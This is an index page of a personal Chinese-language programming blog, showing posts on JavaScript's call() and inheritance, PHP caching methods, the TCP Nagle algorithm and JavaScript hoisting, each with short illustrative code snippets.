
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>MZJ的博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="lianMo">
    

    
    <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="MZJ的博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="MZJ的博客">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MZJ的博客">
<meta name="twitter:description">

    
    <link rel="alternative" href="/atom.xml" title="MZJ的博客" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="MZJ的博客" title="MZJ的博客"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="MZJ的博客">MZJ的博客</a></h1>
				<h2 class="blog-motto">make dream</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/05/24/inherit/" title="关于JS的call函数的一点补充" itemprop="url">关于JS的call函数的一点补充</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-05-24T08:54:24.000Z" itemprop="datePublished"> 发表于 2016-05-24</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>关于JavaScript的call函数在实际用过后有一点需要补充，<br>call的继承只会复制父类自定义的成员，但是通过原型链绑定的方法不会被<br>call方法所复制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Base()</span><br><span class="line">&#123;</span><br><span class="line">    this.name = &quot;Base&quot;;</span><br><span class="line">    this.tell = function(str)&#123; alert(str);&#125;;</span><br><span class="line">&#125;</span><br><span class="line">Base.prototype.sayHello = function()&#123; alert(this.name);&#125;;//通过原型链绑定方法</span><br><span class="line"></span><br><span class="line">function Child()</span><br><span class="line">&#123;</span><br><span class="line">    Base.call(this);//通过call复制</span><br><span class="line">&#125;</span><br><span class="line">var c = new Child();</span><br><span class="line">c.tell(&quot;c calling&quot;);</span><br><span class="line">c.sayHello();</span><br></pre></td></tr></table></figure>
<p>上述代码会报错对象c找不到方法sayHello(),所以call方法无法连同原型链一起复制。</p>
<p>相对应的nodeJS里边的函数inherit()则只进行原型链绑定方法的继承而不进行构造函数<br>里定义的成员的继承。</p>
<p>假如需要都继承还是要用回原型继承的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function Base()</span><br><span class="line">&#123;</span><br><span class="line">    this.name = &quot;Base&quot;;</span><br><span class="line">    this.tell = function(str)&#123; alert(str);&#125;;</span><br><span class="line">&#125;</span><br><span class="line">Base.prototype.sayHello = function()&#123; alert(this.name);&#125;;//通过原型链绑定方法</span><br><span class="line"></span><br><span class="line">function Child()</span><br><span class="line">&#123;</span><br><span class="line">    //Base.call(this);//使用原型继承这句就不需要了。</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = new Base();//通过原型继承</span><br><span class="line">Child.prototype.constructor = Child; //重新指向构造的是Child类的对象</span><br><span class="line"></span><br><span class="line">var c = new Child();</span><br><span class="line">c.tell(&quot;c calling&quot;);</span><br><span class="line">c.sayHello();</span><br></pre></td></tr></table></figure>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/js/">js</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/05/22/JScall/" title="JavaScript call函数" itemprop="url">JavaScript call函数</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-05-22T09:11:48.000Z" itemprop="datePublished"> 发表于 2016-05-22</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>在JavaScript中有一个很有用的函数，常用于继承和代码复用上<br>那就是 call() 函数。<br>先来看看函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call([thisObj[,arg1[, arg2[, [,.argN]]]]]) </span><br><span class="line"></span><br><span class="line">obj1.method1.call(obj2,argument1,argument2) //使用方法</span><br></pre></td></tr></table></figure>
<p>描述：<br>调用一个对象的一个方法，以另一个对象替换当前对象。<br>参数：<br>thisObj<br>可选项。将被用作当前对象的对象。<br>arg1, arg2, , argN<br>可选项。将被传递方法参数序列。 </p>
<p>说明 </p>
<p>call 方法可以用来代替另一个对象调用一个方法。call 方法可将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。 </p>
<p>如果没有提供 thisObj 参数，那么 Global 对象被用作 thisObj。 </p>
<p>光看上边的解释很难清除call函数的用法，下面举个例子来介绍：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function add(a,b) </span><br><span class="line">&#123; </span><br><span class="line">    alert(a+b); </span><br><span class="line">&#125; </span><br><span class="line">function sub(a,b) </span><br><span class="line">&#123; </span><br><span class="line">    alert(a-b); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">add.call(sub,3,1);</span><br></pre></td></tr></table></figure>
<p>最后弹出的是4<br>分析：因为call的效果就是把obj1(add)的方法放到obj2(sub)上使用，后边的都是<br>要使用时传入的参数。也就是说把加法的方法强制的加到减法上使用，虽然是减法实际上<br>做的是加法的函数。<br>可以看成是<br>add.call(sub,3,1) == add(3,1) </p>
<p>再看一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function Class1() </span><br><span class="line">&#123; </span><br><span class="line">    this.name = &quot;class1&quot;; </span><br><span class="line"></span><br><span class="line">    this.showNam = function() </span><br><span class="line">    &#123; </span><br><span class="line">        alert(this.name); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function Class2() </span><br><span class="line">&#123; </span><br><span class="line">    this.name = &quot;class2&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">var c1 = new Class1(); </span><br><span class="line">var c2 = new Class2(); </span><br><span class="line"></span><br><span class="line">c1.showNam.call(c2);</span><br></pre></td></tr></table></figure></p>
<p>虽然Class2一开始没有定义showNam的方法，但是通过call把c2替代了c1<br>执行showNam方法，此时的this指向的对象是c2，所以实际上执行<br>alert(“class2”)。</p>
<p>call方法更多的使用在继承上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function Class1() </span><br><span class="line">&#123; </span><br><span class="line">    this.showTxt = function(txt) </span><br><span class="line">    &#123; </span><br><span class="line">        alert(txt); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function Class2() </span><br><span class="line">&#123; </span><br><span class="line">    Class1.call(this); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">var c2 = new Class2(); </span><br><span class="line"></span><br><span class="line">c2.showTxt(&quot;cc&quot;);</span><br></pre></td></tr></table></figure>
<p>Class2没有定义showTxt函数，但是通过在Class2内部引用Class1.call(this)，把<br>Class1的方法都复制给Class2了，所以c2也可以直接使用showTxt()函数。实现了继<br>承的效果。</p>
<p>同理可以实现多重继承<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function Class10() </span><br><span class="line">&#123; </span><br><span class="line">    this.showSub = function(a,b) </span><br><span class="line">    &#123; </span><br><span class="line">        alert(a-b); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function Class11() </span><br><span class="line">&#123; </span><br><span class="line">    this.showAdd = function(a,b) </span><br><span class="line">    &#123; </span><br><span class="line">        alert(a+b); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function Class2() </span><br><span class="line">&#123; </span><br><span class="line">    Class10.call(this); </span><br><span class="line">    Class11.call(this); //继承了两个类的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><b>需要注意</b>的是，如果被继承的两个类中有相同的成员将会被按照<br>继承顺序所覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function baseA()  // base Class A</span><br><span class="line">  &#123;</span><br><span class="line">   this.member = &quot;baseA member&quot;;</span><br><span class="line">   this.showSelfA = function()</span><br><span class="line">   &#123;</span><br><span class="line">    window.alert(this.member);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function baseB()  // base Class B</span><br><span class="line">  &#123;</span><br><span class="line">   this.member = &quot;baseB member&quot;;</span><br><span class="line">   this.showSelfB = function()</span><br><span class="line">   &#123;</span><br><span class="line">    window.alert(this.member);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function extendAB()  // Inherit Class from A and B</span><br><span class="line">  &#123;</span><br><span class="line">   baseA.call(this); // call for A</span><br><span class="line">   baseB.call(this); // call for B</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  window.onload = function()</span><br><span class="line">  &#123;</span><br><span class="line">   var extend = new extendAB(); </span><br><span class="line">   extend.showSelfA();  // show A</span><br><span class="line">   extend.showSelfB();  // show B</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>最后输出的是<br>baseB member<br>baseB member</p>
<p>原因是extendAB对象的成员变量member在被baseB.call(this);实例化时，被baseB的<br>成员member覆盖了，即extendAB的成员member由baseA member赋值成了baseB member<br>所以在继承时需要多加注意。</p>
<p>此外还需要注意的一点是要弄清楚call后this指向的是哪个对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var func = new function()</span><br><span class="line">  &#123;</span><br><span class="line">   this.a = &quot;func&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var func2 = function(x)</span><br><span class="line">  &#123;</span><br><span class="line">   var a = &quot;func2&quot;;</span><br><span class="line">   alert(this.a);    </span><br><span class="line">   alert(x);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  func2.call(func, &quot;func3&quot;);      // show func and func2</span><br></pre></td></tr></table></figure>
<p>最后结果<br>func<br>func3<br>1、函数func2调用call方法，this默认指向第一个参数func函数对象，因此this.value为this.a，即func<br>2、函数func2调用call方法，第二个参数属于函数对象func2的参数，因此alert(x)为第二个参数func3</p>
<p>最后再提一点就是 <b>call()</b> 和 <b>apply()</b> 的区别</p>
<p>根据函数说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call( thisArg [，arg1，arg2，… ] );       // 参数列表，arg1，arg2，...</span><br><span class="line">apply(thisArg [，argArray] );                 // 参数数组，argArray</span><br></pre></td></tr></table></figure>
<p>实际上两者的效果是一样的，区别在于call的参数部分(arg1,arg2…)是不固定的，<br>可以是任意类型，但是apply的一定是数组才可以。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/js/">js</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/05/14/phpcache/" title="PHP缓存" itemprop="url">PHP缓存</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-05-14T01:45:12.000Z" itemprop="datePublished"> 发表于 2016-05-14</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>在一些流量大的网站中，为了减少对服务器的压力，通常会设置缓存<br>把一些经常被访问而又很少更改的资源存储到缓存，到需要时才引用缓存，<br>能够大幅度的减少数据库查询次数，减轻服务器压力，提高性能。</p>
<p>常见的比如网站的导航栏，footer的信息，分类信息之类的基本定下来就不会<br>改变的而又经常需要被引用，适合放到缓存中。</p>
<p><a href="http://www.php100.com/html/php/lei/2015/0919/8969.html" target="_blank" rel="external">参考文章:PHP中9大缓存技术总结</a></p>
<h3 id="PHP缓存技术-PHP-Cache-Technology"><a href="#PHP缓存技术-PHP-Cache-Technology" class="headerlink" title="PHP缓存技术(PHP Cache Technology)"></a>PHP缓存技术(PHP Cache Technology)</h3><p>先来看看定义：<br><b>PHP缓存包括PHP编译缓存和PHP数据缓存两种。PHP是一种解释型语言，属于边编译边运行的那种。<br>这种运行模式的优点是程序修改很方便，但是运行效率却很低下。PHP编译缓存针对这种情况做改进<br>处理，使得PHP语言只要运行一次，就可以把程序的编译结果缓存起来。</b></p>
<p>目前缓存技术主要用于两大方向：针对数据库数据进行缓存和针对PHP模板数据进行缓存。<br>针对数据库数据进行缓存的工具有memcache等。针对PHP模板数据进行缓存的工具主要有smarty等。</p>
<h4 id="1-数据缓存技术"><a href="#1-数据缓存技术" class="headerlink" title="1.数据缓存技术"></a>1.数据缓存技术</h4><p>数据缓存：就是把需要用到的数据(对象，数组)保存到缓存文件里，比如从数据库获得某个商品<br>的信息，包括价格数量之类的，封装成一个对象，通过序列化(serialize)后保存到缓存文件中，<br>下次需要再查看该商品时直接从缓存中获得，不需要再进行查询。</p>
<p>常用的数据库数据缓存技术有(写入到文件的数据格式)：<br>1.序列化（串行化）缓存<br>2.JSON缓存<br>3.XML缓存<br>4.Array缓存</p>
<h3 id="2-页面部分缓存"><a href="#2-页面部分缓存" class="headerlink" title="2.页面部分缓存"></a>2.页面部分缓存</h3><p>对于一些动态内容的页面，需要先从数据库获取数据然后再赋值到页面上的元素，<br>为了减少每次访问页面都要进行数据库查询，可以先检测相应的缓存页面文件是否存在，<br>如果不存在，就连接数据库，得到数据，显示页面并同时生成缓存页面文件，这样下次访问<br>的时候页面文件就发挥作用了。<br>(模板引擎和网上常见的一些PHP缓存机制类通常有此功能，例如smarty模板、thinkphp框架)</p>
<h3 id="3-全页面静态化缓存"><a href="#3-全页面静态化缓存" class="headerlink" title="3.全页面静态化缓存"></a>3.全页面静态化缓存</h3><p>把所有页面生成静态化的html然后保留进缓存，用户访问链接时从缓存取出直接访问静态页面，<br>不需要服务器再做一次解析。</p>
<h3 id="4-查询缓存"><a href="#4-查询缓存" class="headerlink" title="4.查询缓存"></a>4.查询缓存</h3><p>把查询语句的结果(表)进行缓存，当下次再需要执行这句查询语句时不用查询数据库直接读取<br>缓存获得表。与数据缓存一样的思路。</p>
<h3 id="5-缓存的更新"><a href="#5-缓存的更新" class="headerlink" title="5.缓存的更新"></a>5.缓存的更新</h3><p>虽然缓存内容很少更新但是还是要考虑数据同步的问题，什么时候更新需要根据情况来考虑。</p>
<p><b>1.时间触发缓存</b><br>设置一个过期时间，假如缓存文件修改时间小于过期时间，使用缓存，否则更新缓存。<br>适用于每日更新的内容。</p>
<p><b>2.内容触发缓存</b><br>当缓存文件内容对应的数据库里的数据/页面，被修改时，触发更新缓存。</p>
<h3 id="6-内存缓存"><a href="#6-内存缓存" class="headerlink" title="6.内存缓存"></a>6.内存缓存</h3><p>目前主流是memcached，跟上边把数据缓存到文件不一样，memcached把数据缓存到内存，<br>但是可以被多个服务器访问。<br>memcached是高性能的分布式内存缓存服务器，通过缓存数据库查询结果，减少数据库访问次数，<br>以提高动态Web应用的速度。memcached 使用了“Key=&gt;Value”方式组织数据。可以允许不同主机<br>上的多个用户同时访问这个缓存系统，一般用于大型网站使用。memcached使用内存缓存数据，所以<br>它是易失的，当服务器重启，或者memcached进程中止，数据便会丢失，所以 memcached不能用来持<br>久保存数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">     $memcachehost = &apos;192.168.123.221&apos;;</span><br><span class="line">     $memcacheport = 10121;</span><br><span class="line">     $memcachelife = 60;</span><br><span class="line">     $memcache = new Memcache;</span><br><span class="line">     $memcache-&gt;connect($memcachehost,$memcacheport) or die (&quot;Could not connect&quot;);</span><br><span class="line">     $memcache-&gt;set(&apos;key&apos;,&apos;缓存的内容&apos;);</span><br><span class="line">     $get = $memcache-&gt;get($key);       //获取信息</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="7-apache缓存模块"><a href="#7-apache缓存模块" class="headerlink" title="7.apache缓存模块"></a>7.apache缓存模块</h3><p>apache安装完以后，是不允许被cache的。如果外接了cache或squid服务器要求进行web加速的话，<br>就需要在htttpd.conf里进行设置，当然前提是在安装apache的时候要激活mod_cache的模块。</p>
<p>安装apache时：<code>./configure –enable-cache –enable-disk-cache –enable-mem-cache</code></p>
<h3 id="8-php-APC缓存扩展"><a href="#8-php-APC缓存扩展" class="headerlink" title="8.php APC缓存扩展"></a>8.php APC缓存扩展</h3><p>Php有一个APC缓存扩展，windows下面为php_apc.dll，需要先加载这个模块，然后是在php.ini里面进行配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[apc] </span><br><span class="line">     extension=php_apc.dll </span><br><span class="line">     apc.rfc1867 = on </span><br><span class="line">     upload_max_filesize = 100M </span><br><span class="line">     post_max_size = 100M </span><br><span class="line">     apc.max_file_size = 200M </span><br><span class="line">     upload_max_filesize = 1000M </span><br><span class="line">     post_max_size = 1000M </span><br><span class="line">     max_execution_time = 600 ;   每个PHP页面运行的最大时间值(秒)，默认30秒 </span><br><span class="line">     max_input_time = 600 ;       每个PHP页面接收数据所需的最大时间，默认60 </span><br><span class="line">     memory_limit = 128M ;       每个PHP页面所吃掉的最大内存，默认8M</span><br></pre></td></tr></table></figure></p>
<h3 id="9-Opcode-缓存"><a href="#9-Opcode-缓存" class="headerlink" title="9.Opcode 缓存"></a>9.Opcode 缓存</h3><p>我们知道，php的执行流程可以用下图来展示：<br><img src="http://www.php100.com/uploadfile/2015/0919/20150919024343438.jpg"><br>首先php代码被解析为Tokens，然后再编译为Opcode码，最后执行Opcode码，返回结果；所以，<br>对于相同的php文件，第一次运行时可以缓存其Opcode码，下次再执行这个页面时，直接会去找到<br>缓存下的opcode码，直接执行最后一步，而不再需要中间的步骤了。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/php/">php</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/05/13/nagle/" title="纳格算法" itemprop="url">纳格算法</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-05-13T03:34:10.000Z" itemprop="datePublished"> 发表于 2016-05-13</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>因为之前看文档看到了这个算法就有点感兴趣，上网找了一篇介绍。<br>转载<a href="http://www.cnblogs.com/ggjucheng/archive/2012/01/15/2323070.html" target="_blank" rel="external">ggjucheng博客</a><br>纳格算法是以减少封包传送量来增进TCP/IP网络的效能。 它是由约翰．纳格任职于Ford Aerospace时命名。</p>
<p>纳格的文件，Congestion Control in IP/TCP Internetworks (RFC896) 描述了他所谓的“小封包问题”－某个应用程式不断地送出小单位的资料，且某些常只占1字节大小。 因为TCP封包具有40字节的标头资讯(TCP与IPv4各占20字节)，这导致了41字节大小的封包只有1字节的可用资讯，造成庞大的浪费。 这种状况常常发生于Telnet工作阶段－大部分的键盘操作会产生1字节的资料并马上送出。 更糟的是，在慢速的网络连线下，这类的封包会大量地在同一时点传输，造成壅塞碰撞(Congestion Collapse)。</p>
<p>纳格算法的工作方式是合并(coalescing)一定数量的输出资料后一次送出。特别的是，只要有已送出的封包尚未确认，传送者会持续缓冲封包，直到累积一定数量的资料才送出。</p>
<p>Nagle算法非常简单，但它能解决问题。这个算法是为发送端的TCP用的：</p>
<ol>
<li>发送端的TCP将它从发送应用程序收到的第一块数据发送出去，哪怕只有一个字节。</li>
<li>在发送第一个报文段（即报文段1）以后，发送端的TCP就在输出缓存中积累数据，并等待：或者接收端的TCP发送出一个确认，或者数据已积累到可以装成一个最大的报文段。在这个时候，发送端的TCP就可以发送这个报文段。</li>
<li>对剩下的传输，重复步骤2。这就是：如果收到了对报文段x的确认，或者数据已积累到可以装成一个最大的报文段，那么就发送下一个报文段(x + 1)。</li>
</ol>
<p>Nagle算法的优点就是简单，并且它考虑到应用程序产生数据的速率，以及网络运输数据的速率。若应用程序比网络更快，则报文段就更大（最大报文段）。若应用程序比网络慢，则报文段就较小（小于最大报文段）。</p>
<p>算法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if there is new data to send</span><br><span class="line">  if the window size &gt;= MSS and available data is &gt;= MSS</span><br><span class="line">    send complete MSS segment now</span><br><span class="line">  else</span><br><span class="line">    if there is unconfirmed data still in the pipe</span><br><span class="line">      enqueue data in the buffer until an acknowledge is received</span><br><span class="line">    else</span><br><span class="line">      send data immediately</span><br><span class="line">    end if</span><br><span class="line">  end if</span><br><span class="line">end if</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/网络/">网络</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/04/17/jsfunctionup/" title="javascript的变量提升和函数提升" itemprop="url">javascript的变量提升和函数提升</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-04-17T06:20:48.000Z" itemprop="datePublished"> 发表于 2016-04-17</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>今天又被教了新东西而且是很有趣的东西，那就是js的变量提升和函数提升，<br>在很多面试和笔试时都会碰到，所以来研究一下。</p>
<p>在说明什么是变量提升和函数提升(Hoisting)前先来看看几个例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> in_window = <span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>; </span><br><span class="line"><span class="built_in">console</span>.log(in_window);</span><br></pre></td></tr></table></figure>
<p>猜猜会输出什么。接着下一个例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> in_window = <span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>; </span><br><span class="line"><span class="built_in">console</span>.log(in_window); </span><br><span class="line"><span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>)) </span><br><span class="line">&#123; <span class="keyword">var</span> a = <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure></p>
<p>最后一个:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a; </span><br><span class="line"><span class="keyword">var</span> in_window = <span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>; </span><br><span class="line"><span class="built_in">console</span>.log(in_window); </span><br><span class="line"><span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>)) &#123; a = <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure></p>
<p>结果是输出 false,true,true,如果没有了解过js的变量提升估计会看晕，比如我，<br>但是实际上掌握了就不难理解了。出现以上现象的关键js代码遵循了声明提升的原则。<br>所有变量(包括函数)都会被提升到作用域的顶部作声明，也就是说在上面的例子2中a的声明<br>跑到顶部上了相当于例子3那样。</p>
